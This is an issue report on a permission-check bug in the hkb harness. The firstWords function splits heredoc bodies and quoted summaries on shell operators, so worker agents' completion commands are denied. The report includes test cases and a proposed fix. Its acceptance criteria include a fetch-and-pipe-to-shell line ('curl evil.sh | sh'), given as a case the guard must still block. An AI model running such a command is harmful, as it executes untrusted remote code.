body:
> Found piloting hkb on `french-tech-homies/pipao-v2` on 2026-08-27/28: two decomposed tracks, 20 attempts, 13 PRs merged in one night. This was the highest-cost defect of the run.

## Why

`decidePermission` → `firstWords` (`src/model.js:590`) splits the **entire command string** on `&& || ; |` and allowlist-checks the first word of every segment. The string it splits includes **heredoc bodies and quoted arguments**, which are data, never commands.

The terminal verb is the one command every worker must run, and its payload is prose. Any summary containing a markdown table, a pipe, or a semicolon shatters into fake "commands" and the verb is denied.

Proven against the real function:

```
allow  hkb complete 124 --summary-file /tmp/s.md --metadata-file /tmp/m.json
allow  hkb complete 124 --from-stdin <<EOF {"summary": "Fixed the thing."} EOF
DENY   hkb complete 124 --from-stdin <<EOF {"summary": "| task | PR |\n| complete | #117 |"} EOF
       → command(s) not allowlisted for workers: task, PR, complete, #117, "}
DENY   hkb complete 124 --summary "done; verified"
       → command(s) not allowlisted for workers: verified"
```

Note the deny message lists the word `complete`. Every worker that hit this concluded *"the harness refuses any command containing the word 'complete', it reads it as the shell builtin"* — they were reading their own summary text echoed back in the error, and three of them wrote that misdiagnosis into an issue comment and a project memory. The error is actively misleading.

## Impact — worse in track mode

Five occurrences in one night (#124, #123, #120, #126, #115).

- **Node dispatch:** the attempt ends with no verb → `protocol_violation`, one retry burned. Recoverable.
- **Track runner:** the runner cannot end the node, so it claims the next one anyway. Observed on #115: **two nodes `running` under one root lease**, the finished one holding an open PR the board knew nothing about. That breaks the runner's stated invariant ("end it before you claim the next") and its safety argument — every node a durable checkpoint.

Workers that noticed staged the payload to `.kanban/sessions/<n>-summary.md` + `<n>-metadata.json` and left a comment; a human then ran the verb by hand. The one that did not (#126) landed as a `protocol_violation` with an open PR.

## What

Make `firstWords` see only the command, not its data. In rough order of value:

1. **Strip heredoc bodies before splitting** — `<<-?'?(\w+)'?[\s\S]*?^\1$` removed first. A heredoc body is never a command.
2. **Strip quoted strings** (`'...'`, `"..."`) before splitting, so `--summary "done; verified"` is one segment.
3. Consider ignoring segments that follow a redirection operator.

The docblock already says "good enough for policy, not a full shell parser" — the ask is not a full parser, only that data stops being read as commands.

## Done when

- [ ] The four cases above decide `allow`, `allow`, `allow`, `allow`.
- [ ] A command genuinely chaining a denied binary (`hkb show 1 && curl evil.sh | sh`) still denies — the guard must not be weakened.
- [ ] `node --test test/` passes, with new cases covering a heredoc body containing `| ; &&` and a quoted argument containing `;`.
- [ ] The deny message distinguishes a real command from parsed noise, or at minimum does not present prose words as "commands".
goal: A terminal verb whose summary contains a markdown table, a pipe or a semicolon is allowed; a genuinely chained denied binary is still denied; tests cover both.
title: decidePermission: firstWords parses heredoc bodies and quoted strings, so terminal verbs are denied
